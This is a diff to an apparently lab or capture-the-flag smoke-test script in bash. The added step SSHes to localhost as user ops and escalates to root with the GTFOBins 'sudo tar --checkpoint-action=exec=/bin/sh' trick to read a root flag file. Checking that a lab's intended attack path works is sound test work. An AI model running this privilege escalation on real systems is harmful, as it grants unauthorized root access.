@@ -66,4 +66,14 @@ if ! grep -qE 'OMEGA: DOSSIER-OMEGA-SHA256=[a-f0-9]{64}' <<<"$omega"; then
 fi
 log "OK OMEGA (SSH → vault dossier)"
 
+# Privesc ops → root : sudo tar (GTFOBins checkpoint-action)
+# shellcheck disable=SC2029
+root_body="$(ssh "${ssh_opts[@]}" ops@127.0.0.1 \
+  "sudo /usr/bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action='exec=/bin/sh -c \"cat /opt/omega/proofs/ROOT.txt\"'" \
+  2>/dev/null || true)"
+if ! grep -q 'ROOT: OMEGA-PRIV-ROOT-4421' <<<"$root_body"; then
+  die "ROOT via SSH: flag absent (ops sudo tar → ROOT.txt)"
+fi
+log "OK ROOT (ops → privesc hôte pivot)"
+
 log "Smoke SSH réussi."
